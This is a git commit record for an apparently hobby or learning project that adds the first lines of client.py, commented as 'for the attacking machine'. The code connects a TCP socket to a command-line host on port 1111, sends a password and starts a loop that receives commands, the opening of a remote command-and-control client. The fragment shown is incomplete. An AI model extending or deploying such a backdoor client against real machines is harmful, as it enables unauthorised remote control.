942967f5338747f77dd518ef242ba36ecec08e33
Kevin Seon <apkpj@Kevins-MacBook-Pro.local>
2022-10-05 00:27:14 -0500

    initial change to client.py

--- client.py
+++ client.py
@@ -1,1 +1,14 @@
+import socket
+import os
+import sys
 # this is for the attacking machine
+
+HOST = sys.argv[1] 
+PORT = 1111
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+pwd = sys.argv[2]
+s.send(pwd.encode())
+while True:
+    command = s.recv(4096).decode().split()
